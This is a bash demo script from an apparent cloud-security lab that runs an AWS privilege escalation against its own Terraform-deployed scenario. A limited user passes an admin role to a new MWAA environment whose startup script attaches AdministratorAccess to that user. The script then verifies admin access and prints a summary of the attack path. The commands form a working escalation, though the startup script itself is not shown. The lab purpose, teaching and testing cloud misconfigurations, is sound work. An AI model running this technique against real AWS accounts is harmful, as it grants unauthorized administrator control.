#!/bin/bash

# Demo script for iam:PassRole + airflow:CreateEnvironment privilege escalation
# This script demonstrates how a user with PassRole and MWAA permissions
# can escalate to admin by creating an MWAA environment with an admin execution role
# and a malicious startup script that attaches AdministratorAccess to the starting user


# Disable AWS CLI paging
export AWS_PAGER=""

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
MAGENTA='\033[0;35m'
NC='\033[0m' # No Color

# Dim color for command display
DIM='\033[2m'
CYAN='\033[0;36m'

# Track attack commands for summary
ATTACK_COMMANDS=()

# Display a command before executing it
show_cmd() {
    local identity="$1"; shift
    echo -e "${DIM}[${identity}] \$ $*${NC}"
}

# Display AND record an attack command
show_attack_cmd() {
    local identity="$1"; shift
    echo -e "\n${CYAN}[${identity}] \$ $*${NC}"
    ATTACK_COMMANDS+=("$*")
}

# Configuration
STARTING_USER="pl-prod-mwaa-001-to-admin-starting-user"
ADMIN_ROLE="pl-prod-mwaa-001-to-admin-admin-role"

# Generate random suffix for environment name
RANDOM_SUFFIX=$(cat /dev/urandom | tr -dc 'a-z0-9' | fold -w 6 | head -n 1)
ENVIRONMENT_NAME="pl-mwaa-001-demo-${RANDOM_SUFFIX}"

echo ""
echo -e "${RED}========================================${NC}"
echo -e "${RED}          COST WARNING                  ${NC}"
echo -e "${RED}========================================${NC}"
echo -e "${RED}This demo creates an Amazon MWAA environment which costs:${NC}"
echo -e "${RED}  - MWAA Environment: ~\$0.49/hour (~\$350/month)${NC}"
echo -e "${RED}  - NAT Gateway: ~\$0.045/hour (~\$32/month)${NC}"
echo -e "${RED}${NC}"
echo -e "${RED}The MWAA environment takes 20-30 minutes to create.${NC}"
echo -e "${RED}${NC}"
echo -e "${RED}YOU MUST RUN cleanup_attack.sh IMMEDIATELY AFTER THIS DEMO${NC}"
echo -e "${RED}to avoid significant AWS charges!${NC}"
echo -e "${RED}========================================${NC}"
echo ""
echo -e "${YELLOW}Press Enter to continue or Ctrl+C to cancel...${NC}"
read -r

echo -e "${GREEN}========================================${NC}"
echo -e "${GREEN}IAM PassRole + MWAA CreateEnvironment Privilege Escalation Demo${NC}"
echo -e "${GREEN}========================================${NC}\n"

# Step 1: Retrieve credentials and region from Terraform outputs
echo -e "${YELLOW}Step 1: Retrieving scenario configuration from Terraform${NC}"
cd ../../../../../..  # Navigate to root of terraform project

# Get the module output
MODULE_OUTPUT=$(terraform output -json 2>/dev/null | jq -r '.single_account_privesc_one_hop_to_admin_mwaa_001_iam_passrole_airflow_createenvironment.value // empty')

if [ -z "$MODULE_OUTPUT" ]; then
    echo -e "${RED}Error: Could not find terraform output${NC}"
    echo "Make sure you've deployed this scenario with: terraform apply"
    exit 1
fi

# Extract credentials
STARTING_ACCESS_KEY_ID=$(echo "$MODULE_OUTPUT" | jq -r '.starting_user_access_key_id')
STARTING_SECRET_ACCESS_KEY=$(echo "$MODULE_OUTPUT" | jq -r '.starting_user_secret_access_key')

if [ "$STARTING_ACCESS_KEY_ID" == "null" ] || [ -z "$STARTING_ACCESS_KEY_ID" ]; then
    echo -e "${RED}Error: Could not extract credentials from terraform output${NC}"
    exit 1
fi

# Retrieve readonly credentials
READONLY_ACCESS_KEY=$(terraform output -raw prod_readonly_user_access_key_id 2>/dev/null)
READONLY_SECRET_KEY=$(terraform output -raw prod_readonly_user_secret_access_key 2>/dev/null)

if [ -z "$READONLY_ACCESS_KEY" ] || [ "$READONLY_ACCESS_KEY" == "null" ]; then
    echo -e "${RED}Error: Could not find readonly credentials in terraform output${NC}"
    exit 1
fi

# Extract infrastructure details
ADMIN_ROLE_ARN=$(echo "$MODULE_OUTPUT" | jq -r '.admin_role_arn')
VPC_ID=$(echo "$MODULE_OUTPUT" | jq -r '.vpc_id')
PRIVATE_SUBNET_IDS=$(echo "$MODULE_OUTPUT" | jq -r '.private_subnet_ids | join(",")')
SECURITY_GROUP_ID=$(echo "$MODULE_OUTPUT" | jq -r '.security_group_id')
ATTACKER_BUCKET_NAME=$(echo "$MODULE_OUTPUT" | jq -r '.attacker_bucket_name')
# Extract just the S3 key paths (not full S3 URIs) for MWAA parameters
STARTUP_SCRIPT_S3_KEY="startup.sh"  # Key within the bucket
DAGS_S3_KEY="dags"  # Path within the bucket (no trailing slash for MWAA)

AWS_REGION=$(terraform output -raw aws_region 2>/dev/null || echo "")
if [ -z "$AWS_REGION" ]; then
    echo -e "${YELLOW}Warning: Could not retrieve region from Terraform, defaulting to us-east-1${NC}"
    AWS_REGION="us-east-1"
fi

echo "Retrieved access key for: $STARTING_USER"
echo "Access Key ID: ${STARTING_ACCESS_KEY_ID:0:10}..."
echo "Region: $AWS_REGION"
echo "Admin Role ARN: $ADMIN_ROLE_ARN"
echo "VPC ID: $VPC_ID"
echo "Private Subnets: $PRIVATE_SUBNET_IDS"
echo "Security Group: $SECURITY_GROUP_ID"
echo "Attacker Bucket: $ATTACKER_BUCKET_NAME"
echo "Startup Script Key: $STARTUP_SCRIPT_S3_KEY"
echo "DAGs S3 Key: $DAGS_S3_KEY"
echo -e "${GREEN}✓ Retrieved configuration from Terraform${NC}\n"

# Navigate back to scenario directory
cd - > /dev/null

# Credential switching helpers
use_starting_user_creds() {
    export AWS_ACCESS_KEY_ID="$STARTING_ACCESS_KEY_ID"
    export AWS_SECRET_ACCESS_KEY="$STARTING_SECRET_ACCESS_KEY"
    unset AWS_SESSION_TOKEN
}
use_readonly_creds() {
    export AWS_ACCESS_KEY_ID="$READONLY_ACCESS_KEY"
    export AWS_SECRET_ACCESS_KEY="$READONLY_SECRET_KEY"
    unset AWS_SESSION_TOKEN
}

# Source demo permissions library for validation restriction
SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
source "$SCRIPT_DIR/../../../../../../scripts/lib/demo_permissions.sh"

# Restrict helpful permissions during validation run
restrict_helpful_permissions "$SCRIPT_DIR/scenario.yaml"
setup_demo_restriction_trap "$SCRIPT_DIR/scenario.yaml"

# Step 2: Configure AWS credentials with starting user
echo -e "${YELLOW}Step 2: Configuring AWS CLI with starting user credentials${NC}"
use_starting_user_creds
export AWS_REGION=$AWS_REGION

echo "Using region: $AWS_REGION"

# Verify starting user identity
show_cmd "Attacker" "aws sts get-caller-identity --query 'Arn' --output text"
CURRENT_USER=$(aws sts get-caller-identity --query 'Arn' --output text)
echo "Current identity: $CURRENT_USER"

if [[ ! $CURRENT_USER == *"$STARTING_USER"* ]]; then
    echo -e "${RED}Error: Not running as $STARTING_USER${NC}"
    exit 1
fi
echo -e "${GREEN}✓ Verified starting user identity${NC}\n"

# Step 3: Get account ID
echo -e "${YELLOW}Step 3: Getting account ID${NC}"
show_cmd "Attacker" "aws sts get-caller-identity --query 'Account' --output text"
ACCOUNT_ID=$(aws sts get-caller-identity --query 'Account' --output text)
echo "Account ID: $ACCOUNT_ID"
echo -e "${GREEN}✓ Retrieved account ID${NC}\n"

# Step 4: Verify lack of admin permissions
echo -e "${YELLOW}Step 4: Verifying we don't have admin permissions yet${NC}"
echo "Attempting to list IAM users (should fail)..."
show_cmd "Attacker" "aws iam list-users --max-items 1"
if aws iam list-users --max-items 1 &> /dev/null; then
    echo -e "${RED}⚠ Unexpectedly have admin permissions already${NC}"
else
    echo -e "${GREEN}✓ Confirmed: Cannot list IAM users (as expected)${NC}"
fi
echo ""

# [EXPLOIT]
# Step 5: Create MWAA environment with admin role and malicious startup script
use_starting_user_creds
echo -e "${YELLOW}Step 5: Creating MWAA environment with admin execution role${NC}"
echo "This is the privilege escalation vector - passing the admin role to MWAA..."
echo ""
echo -e "${BLUE}Environment Name: $ENVIRONMENT_NAME${NC}"
echo -e "${BLUE}Execution Role: $ADMIN_ROLE_ARN${NC}"
echo -e "${BLUE}Source Bucket: s3://$ATTACKER_BUCKET_NAME${NC}"
echo -e "${BLUE}DAGs Path: $DAGS_S3_KEY${NC}"
echo -e "${BLUE}Startup Script: $STARTUP_SCRIPT_S3_KEY${NC}"
echo ""

echo -e "${MAGENTA}The startup script contains code to attach AdministratorAccess to $STARTING_USER${NC}"
echo ""

# Convert comma-separated subnet IDs to JSON array format
SUBNET_1=$(echo "$PRIVATE_SUBNET_IDS" | cut -d',' -f1)
SUBNET_2=$(echo "$PRIVATE_SUBNET_IDS" | cut -d',' -f2)

echo "Creating MWAA environment..."
show_attack_cmd "Attacker" "aws mwaa create-environment --region \"$AWS_REGION\" --name \"$ENVIRONMENT_NAME\" --execution-role-arn \"$ADMIN_ROLE_ARN\" --source-bucket-arn \"arn:aws:s3:::$ATTACKER_BUCKET_NAME\" --dag-s3-path \"$DAGS_S3_KEY\" --startup-script-s3-path \"$STARTUP_SCRIPT_S3_KEY\" --network-configuration \"SubnetIds=$SUBNET_1,$SUBNET_2,SecurityGroupIds=$SECURITY_GROUP_ID\" --environment-class \"mw1.small\" --airflow-version \"2.8.1\" --webserver-access-mode \"PUBLIC_ONLY\" --max-workers 2 --min-workers 1 --output json"
aws mwaa create-environment \
    --region "$AWS_REGION" \
    --name "$ENVIRONMENT_NAME" \
    --execution-role-arn "$ADMIN_ROLE_ARN" \
    --source-bucket-arn "arn:aws:s3:::$ATTACKER_BUCKET_NAME" \
    --dag-s3-path "$DAGS_S3_KEY" \
    --startup-script-s3-path "$STARTUP_SCRIPT_S3_KEY" \
    --network-configuration "SubnetIds=$SUBNET_1,$SUBNET_2,SecurityGroupIds=$SECURITY_GROUP_ID" \
    --environment-class "mw1.small" \
    --airflow-version "2.8.1" \
    --webserver-access-mode "PUBLIC_ONLY" \
    --max-workers 2 \
    --min-workers 1 \
    --output json > /dev/null

if [ $? -eq 0 ]; then
    echo -e "${GREEN}✓ Successfully initiated MWAA environment creation!${NC}"
else
    echo -e "${RED}Error: Failed to create MWAA environment${NC}"
    exit 1
fi
echo ""

# [OBSERVATION]
# Step 6: Wait for MWAA environment to be available
use_readonly_creds
echo -e "${YELLOW}Step 6: Waiting for MWAA environment to be available${NC}"
echo -e "${BLUE}This typically takes 20-30 minutes. Please be patient...${NC}"
echo ""

MAX_WAIT=2400  # 40 minutes maximum
ELAPSED=0
CHECK_INTERVAL=60  # Check every minute

while [ $ELAPSED -lt $MAX_WAIT ]; do
    show_cmd "ReadOnly" "aws mwaa get-environment --region \"$AWS_REGION\" --name \"$ENVIRONMENT_NAME\" --query 'Environment.Status' --output text"
    STATUS=$(aws mwaa get-environment \
        --region "$AWS_REGION" \
        --name "$ENVIRONMENT_NAME" \
        --query 'Environment.Status' \
        --output text 2>/dev/null)

    MINUTES=$((ELAPSED / 60))
    echo "  [${MINUTES}m] Environment status: $STATUS"

    if [ "$STATUS" = "AVAILABLE" ]; then
        echo ""
        echo -e "${GREEN}✓ MWAA environment is now available!${NC}"
        break
    elif [ "$STATUS" = "CREATE_FAILED" ]; then
        echo ""
        echo -e "${RED}✗ MWAA environment creation failed!${NC}"
        echo "Fetching error details..."
        aws mwaa get-environment \
            --region "$AWS_REGION" \
            --name "$ENVIRONMENT_NAME" \
            --query 'Environment.LastUpdate' \
            --output json
        echo ""
        echo -e "${RED}Please run cleanup_attack.sh to clean up any resources${NC}"
        exit 1
    fi

    sleep $CHECK_INTERVAL
    ELAPSED=$((ELAPSED + CHECK_INTERVAL))
done

if [ $ELAPSED -ge $MAX_WAIT ]; then
    echo -e "${RED}✗ Timeout: Environment did not become available within expected time${NC}"
    echo -e "${RED}Please run cleanup_attack.sh to clean up${NC}"
    exit 1
fi
echo ""

# Step 7: Wait for startup script execution and IAM propagation
echo -e "${YELLOW}Step 7: Waiting for startup script execution and IAM policy propagation${NC}"
echo "The startup script runs when the environment starts up..."
echo "Waiting 30 seconds for the startup script to execute and IAM changes to propagate..."
sleep 30
echo -e "${GREEN}✓ Startup script should have executed${NC}\n"

# [OBSERVATION]
# Step 8: Verify admin access
use_readonly_creds
echo -e "${YELLOW}Step 8: Verifying administrator access${NC}"
echo "Checking if AdministratorAccess is now attached to starting user..."

# Check attached policies
show_cmd "ReadOnly" "aws iam list-attached-user-policies --user-name \"$STARTING_USER\" --query 'AttachedPolicies[*].PolicyArn' --output text"
ATTACHED_POLICIES=$(aws iam list-attached-user-policies \
    --user-name "$STARTING_USER" \
    --query 'AttachedPolicies[*].PolicyArn' \
    --output text 2>/dev/null || echo "")

if echo "$ATTACHED_POLICIES" | grep -q "AdministratorAccess"; then
    echo -e "${GREEN}✓ AdministratorAccess policy is attached to $STARTING_USER!${NC}"
else
    echo -e "${YELLOW}Note: AdministratorAccess not yet visible. Checking again after waiting...${NC}"
    sleep 15
fi

echo ""
echo "Attempting to list IAM users..."

show_cmd "ReadOnly" "aws iam list-users --max-items 3 --output table"
if aws iam list-users --max-items 3 --output table; then
    echo -e "${GREEN}✓ Successfully listed IAM users!${NC}"
    echo -e "${GREEN}✓ ADMIN ACCESS CONFIRMED${NC}"
else
    echo -e "${YELLOW}Note: May need to wait longer for IAM propagation${NC}"
    echo "The startup script should have attached AdministratorAccess to $STARTING_USER"
fi
echo ""

# Summary
# Restore helpful permissions for manual exploration
restore_helpful_permissions "$SCRIPT_DIR/scenario.yaml"

echo -e "\n${GREEN}========================================${NC}"
echo -e "${GREEN}✅ PRIVILEGE ESCALATION SUCCESSFUL!${NC}"
echo -e "${GREEN}========================================${NC}"
echo -e "\n${YELLOW}Attack Summary:${NC}"
echo "1. Started as: $STARTING_USER (limited permissions)"
echo "2. Created MWAA environment: $ENVIRONMENT_NAME"
echo "3. Passed admin role to MWAA: $ADMIN_ROLE"
echo "4. MWAA executed startup script with admin credentials"
echo "5. Startup script attached AdministratorAccess to starting user"
echo "6. Achieved: Administrator Access"

echo -e "\n${YELLOW}Attack Path:${NC}"
echo -e "  $STARTING_USER → (iam:PassRole + airflow:CreateEnvironment)"
echo -e "  → MWAA Environment with $ADMIN_ROLE"
echo -e "  → (Startup script execution with admin credentials)"
echo -e "  → (iam:AttachUserPolicy) → Admin Access"

if [ ${#ATTACK_COMMANDS[@]} -gt 0 ]; then
    echo -e "\n${YELLOW}Attack Commands:${NC}"
    for cmd in "${ATTACK_COMMANDS[@]}"; do
        echo -e "  ${CYAN}\$ ${cmd}${NC}"
    done
fi

echo -e "\n${YELLOW}Attack Artifacts:${NC}"
echo "- MWAA Environment: $ENVIRONMENT_NAME"
echo "- Policy Attachment: AdministratorAccess on $STARTING_USER"

echo ""
echo -e "${RED}========================================${NC}"
echo -e "${RED}          CRITICAL: CLEANUP REQUIRED   ${NC}"
echo -e "${RED}========================================${NC}"
echo -e "${RED}The MWAA environment is incurring charges (~\$0.49/hour)!${NC}"
echo -e "${RED}${NC}"
echo -e "${RED}Run the cleanup script IMMEDIATELY:${NC}"
echo -e "${RED}  ./cleanup_attack.sh${NC}"
echo -e "${RED}${NC}"
echo -e "${RED}Cleanup will take 10-20 minutes to delete the environment.${NC}"
echo -e "${RED}========================================${NC}"
echo ""

# Mark demo as active for plabs tracking
touch "$(dirname "$0")/.demo_active"
